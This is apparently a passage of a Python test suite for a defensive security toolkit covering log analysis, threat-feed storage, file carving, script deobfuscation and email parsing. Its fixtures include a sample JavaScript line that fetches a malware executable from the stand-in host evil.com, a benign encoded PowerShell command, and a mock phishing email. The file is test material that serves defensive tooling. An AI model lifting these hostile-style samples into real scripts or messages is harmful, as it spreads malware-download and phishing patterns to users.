        from vlair.tools.log_analyzer import main

        log_file = tmp_path / "syslog"
        log_file.write_text(
            "Jan  1 10:00:00 myhost sshd[1234]: Accepted publickey for user from 1.2.3.4\n"
        )

        with patch(
            "sys.argv", ["analyzer.py", str(log_file), "--type", "syslog"]
        ):
            main()


# ============================================================================
# Domain IP Intel - additional coverage
# ============================================================================


class TestDomainIPIntelFormatFunctions:
    """Test domain/ip intel format output functions and main()"""

    def test_analyze_domain_with_mocked_apis(self):
        from vlair.tools.domain_ip_intel import DomainIPIntelligence

        with patch.dict(os.environ, {"VT_API_KEY": "test", "ABUSEIPDB_KEY": "test"}):
            intel = DomainIPIntelligence(verbose=False)

        # Mock VT API to return clean result
        with patch.object(
            intel.vt_api,
            "lookup_domain",
            return_value={
                "malicious": 0,
                "suspicious": 0,
                "harmless": 60,
                "categories": {},
            },
        ):
            result = intel.analyze("example.com")

        assert result is not None

    def test_analyze_ip(self):
        from vlair.tools.domain_ip_intel import DomainIPIntelligence

        with patch.dict(os.environ, {}, clear=True):
            intel = DomainIPIntelligence(verbose=False)

        result = intel.analyze_ip("8.8.8.8")
        assert result is not None
        assert result["target"] == "8.8.8.8"

    def test_analyze_invalid_target(self):
        from vlair.tools.domain_ip_intel import DomainIPIntelligence

        with patch.dict(os.environ, {}, clear=True):
            intel = DomainIPIntelligence(verbose=False)

        result = intel.analyze("not_valid!!!")
        assert "error" in result or result.get("type") == "unknown"


# ============================================================================
# File Carver - additional coverage
# ============================================================================


class TestFileCarverExtended:
    """Extended tests for file carver"""

    def test_carve_file_with_jpeg(self, tmp_path):
        from vlair.tools.file_carver import FileCarver

        # Create a binary file with JPEG magic bytes
        test_file = tmp_path / "disk.img"
        # JPEG header: FF D8 FF E0
        content = b"\x00" * 100 + b"\xff\xd8\xff\xe0" + b"\x00" * 50 + b"\xff\xd9" + b"\x00" * 100
        test_file.write_bytes(content)

        output_dir = tmp_path / "carved"
        carver = FileCarver(output_dir=str(output_dir))
        results = carver.carve_from_file(str(test_file))

        assert isinstance(results, list)

    def test_carve_nonexistent_file(self, tmp_path):
        from vlair.tools.file_carver import FileCarver

        output_dir = tmp_path / "carved"
        carver = FileCarver(output_dir=str(output_dir))
        results = carver.carve_from_file("/nonexistent/file.img")

        assert isinstance(results, list)

    def test_detect_file_type(self, tmp_path):
        from vlair.tools.file_carver import FileCarver

        output_dir = tmp_path / "carved"
        carver = FileCarver(output_dir=str(output_dir))

        # Test JPEG detection
        jpeg_header = b"\xff\xd8\xff\xe0"
        result = carver.detect_file_type(jpeg_header)
        assert result == "jpeg" or result is not None

    def test_carve_with_type_filter(self, tmp_path):
        from vlair.tools.file_carver import FileCarver

        test_file = tmp_path / "disk.img"
        content = b"\x00" * 100 + b"\xff\xd8\xff\xe0" + b"\x00" * 200
        test_file.write_bytes(content)

        output_dir = tmp_path / "carved"
        carver = FileCarver(output_dir=str(output_dir))
        results = carver.carve_from_file(str(test_file), file_types=["jpeg"])

        assert isinstance(results, list)


# ============================================================================
# Cache Manager - additional coverage
# ============================================================================


class TestCacheManagerExtended:
    """Extended tests for cache manager"""

    def test_cache_with_custom_namespace(self):
        from vlair.common.cache_manager import get_cache

        cache = get_cache()
        cache.set("key1", {"data": "test"}, namespace="test_ns", ttl=300)
        result = cache.get("key1", namespace="test_ns")
        assert result is not None
        assert result["data"] == "test"

    def test_cache_delete(self):
        from vlair.common.cache_manager import get_cache

        cache = get_cache()
        cache.set("to_delete", {"x": 1}, namespace="test_ns")
        cache.delete("to_delete", namespace="test_ns")
        assert cache.get("to_delete", namespace="test_ns") is None

    def test_cache_clear_namespace(self):
        from vlair.common.cache_manager import get_cache

        cache = get_cache()
        cache.set("k1", {"a": 1}, namespace="clear_ns")
        cache.set("k2", {"b": 2}, namespace="clear_ns")
        cleared = cache.clear_namespace("clear_ns")
        assert isinstance(cleared, int)

    def test_cache_clear_all(self):
        from vlair.common.cache_manager import get_cache

        cache = get_cache()
        cache.set("k1", {"a": 1}, namespace="ns1")
        result = cache.clear_all()
        assert result is True

    def test_cache_get_namespaces(self):
        from vlair.common.cache_manager import get_cache

        cache = get_cache()
        cache.set("k1", {"a": 1}, namespace="ns_test_1")
        namespaces = cache.get_namespaces()
        assert isinstance(namespaces, list)

    def test_cache_health_check(self):
        from vlair.common.cache_manager import get_cache

        cache = get_cache()
        health = cache.health_check()
        assert isinstance(health, dict)
        assert "healthy" in health


# ============================================================================
# Threat Feed Aggregator - additional coverage
# ============================================================================


class TestThreatFeedAggregatorExtended:
    """Extended tests for threat feed aggregator"""

    def test_store_and_search(self, tmp_path):
        from vlair.tools.threat_feed_aggregator import ThreatFeedStorage

        db_path = str(tmp_path / "feeds.db")
        storage = ThreatFeedStorage(db_path)

        # Store IOC using the correct dict-based API
        ioc = {
            "type": "domain",
            "value": "evil.com",
            "source": "threatfox",
            "malware_family": "Emotet",
            "confidence": 90,
            "tags": ["emotet", "banking"],
        }
        storage.store_ioc(ioc)

        # Search
        results = storage.search_ioc(value="evil.com")
        assert len(results) > 0

    def test_search_by_malware_family(self, tmp_path):
        from vlair.tools.threat_feed_aggregator import ThreatFeedStorage

        db_path = str(tmp_path / "feeds.db")
        storage = ThreatFeedStorage(db_path)

        ioc = {
            "type": "domain",
            "value": "evil.com",
            "source": "threatfox",
            "malware_family": "Emotet",
            "confidence": 90,
        }
        storage.store_ioc(ioc)

        results = storage.search_ioc(malware_family="Emotet")
        assert len(results) > 0

    def test_get_statistics(self, tmp_path):
        from vlair.tools.threat_feed_aggregator import ThreatFeedStorage

        db_path = str(tmp_path / "feeds.db")
        storage = ThreatFeedStorage(db_path)

        storage.store_ioc({
            "type": "domain",
            "value": "evil1.com",
            "source": "threatfox",
            "confidence": 90,
        })
        storage.store_ioc({
            "type": "ip",
            "value": "1.2.3.4",
            "source": "urlhaus",
            "confidence": 80,
        })

        stats = storage.get_statistics()
        assert stats["total_iocs"] >= 2


# ============================================================================
# Deobfuscator - additional coverage
# ============================================================================


class TestDeobfuscatorExtended:
    """Extended tests for script deobfuscator"""

    def test_deobfuscate_powershell_encoded_command(self):
        from vlair.tools.deobfuscator import Deobfuscator
        import base64

        encoded = base64.b64encode("Write-Host Hello".encode("utf-16-le")).decode()
        script = f"powershell -EncodedCommand {encoded}"

        deob = Deobfuscator(language="powershell")
        result = deob.deobfuscate(script)

        assert result is not None
        assert "layers" in result or "deobfuscated" in result

    def test_deobfuscate_javascript_fromcharcode(self):
        from vlair.tools.deobfuscator import Deobfuscator

        script = "var x = String.fromCharCode(72,101,108,108,111);"
        deob = Deobfuscator(language="javascript")
        result = deob.deobfuscate(script)

        assert result is not None

    def test_deobfuscate_auto_detect(self):
        from vlair.tools.deobfuscator import Deobfuscator

        deob = Deobfuscator(language="auto")
        result = deob.deobfuscate("var x = 'hello'; console.log(x);")
        assert result is not None

    def test_deobfuscate_with_verbose(self):
        from vlair.tools.deobfuscator import Deobfuscator

        deob = Deobfuscator(language="javascript", verbose=True)
        script = "var url = 'http://evil.com/malware.exe'; fetch(url);"
        result = deob.deobfuscate(script)

        assert result is not None

    def test_deobfuscate_batch_script(self):
        from vlair.tools.deobfuscator import Deobfuscator

        script = "@echo off\nset a=hello\necho %a%"
        deob = Deobfuscator(language="batch")
        result = deob.deobfuscate(script)
        assert result is not None

    def test_decoder_decode_url(self):
        from vlair.tools.deobfuscator import Decoder

        decoder = Decoder()
        result = decoder.decode_url("%48%65%6C%6C%6F")
        assert result == "Hello"

    def test_detect_language_powershell(self):
        from vlair.tools.deobfuscator import Deobfuscator

        deob = Deobfuscator()
        lang = deob.detect_language("$x = Get-Process; Write-Output $x")
        assert lang == "powershell"

    def test_detect_language_javascript(self):
        from vlair.tools.deobfuscator import Deobfuscator

        deob = Deobfuscator()
        lang = deob.detect_language("function test() { var x = 1; }")
        assert lang == "javascript"


# ============================================================================
# EML Parser - additional coverage
# ============================================================================


class TestEMLParserExtended:
    """Extended tests for EML parser"""

    def test_parse_basic_eml(self, tmp_path):
        from vlair.tools.eml_parser import parse_eml, build_summary

        eml_content = """From: sender@evil.com
To: victim@company.com
Subject: Urgent: Account Verification
Date: Mon, 1 Jan 2024 10:00:00 +0000
MIME-Version: 1.0
Content-Type: text/plain

Click here to verify your account: http://evil-phishing.com/login
"""
        eml_file = tmp_path / "test.eml"
        eml_file.write_text(eml_content)

        parsed = parse_eml(str(eml_file))
        assert parsed is not None

    def test_build_summary(self, tmp_path):
        from vlair.tools.eml_parser import parse_eml, build_summary

        eml_content = """From: sender@evil.com
To: victim@company.com
Subject: Test
Date: Mon, 1 Jan 2024 10:00:00 +0000
Content-Type: text/plain

Test body
"""
        eml_file = tmp_path / "test.eml"
        eml_file.write_text(eml_content)

        parsed = parse_eml(str(eml_file))
        if parsed:
            summary = build_summary(parsed, str(eml_file))
            assert summary is not None

    def test_parse_eml_nonexistent(self):
        from vlair.tools.eml_parser import parse_eml

        with pytest.raises(FileNotFoundError):
            parse_eml("/nonexistent/file.eml")

    def test_eml_main_with_file(self, tmp_path):
        from vlair.tools.eml_parser import main

        eml_content = """From: sender@evil.com
To: victim@company.com
Subject: Test
Content-Type: text/plain

Body text
"""
        eml_file = tmp_path / "test.eml"
        eml_file.write_text(eml_content)

        with patch("sys.argv", ["emlParser.py", str(eml_file)]):
            try:
                main()
            except SystemExit:
                pass  # main may exit
